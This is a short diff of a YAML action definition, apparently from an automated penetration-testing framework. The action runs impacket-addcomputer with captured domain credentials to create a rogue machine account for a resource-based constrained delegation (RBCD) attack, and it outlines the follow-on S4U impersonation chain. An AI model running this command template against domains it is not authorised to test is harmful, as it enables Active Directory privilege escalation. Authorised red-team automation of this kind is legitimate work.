@@ -2,19 +2,23 @@ name: addcomputer
 category: ad
 description: Add a machine account to the domain for RBCD/delegation attacks
 preconditions:
-  - has_cred
-  - domain_joined
+- has_cred
+- domain_joined
 parameters:
   target_ip: from_engagement.target_ip
   domain: from_engagement.domain
   username: from_cred.username
   password: from_cred.password
-command_template: "impacket-addcomputer '{domain}/{username}:{password}' -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip {target_ip}"
+command_template: impacket-addcomputer '{domain}/{username}:{password}' -computer-name
+  'FAKE01$' -computer-pass 'Password123!' -dc-ip {target_ip}
 parser: null
 expected_effects:
-  - machine_account_created
+- machine_account_created
 falsifier:
-  pattern: "error|UNWILLING_TO_PERFORM"
+  pattern: error|UNWILLING_TO_PERFORM
   timeout: 30
 model_tier: haiku
-mechanism: "Adds machine account when MachineAccountQuota > 0 (default 10). Required for RBCD attack: add machine account, configure msDS-AllowedToActOnBehalfOfOtherIdentity on target, then S4U2self + S4U2proxy for impersonation."
+mechanism: 'Adds machine account when MachineAccountQuota > 0 (default 10). Required
+  for RBCD attack: add machine account, configure msDS-AllowedToActOnBehalfOfOtherIdentity
+  on target, then S4U2self + S4U2proxy for impersonation.'
+hacktricks_ref: windows-hardening/active-directory-methodology/unconstrained-delegation.md
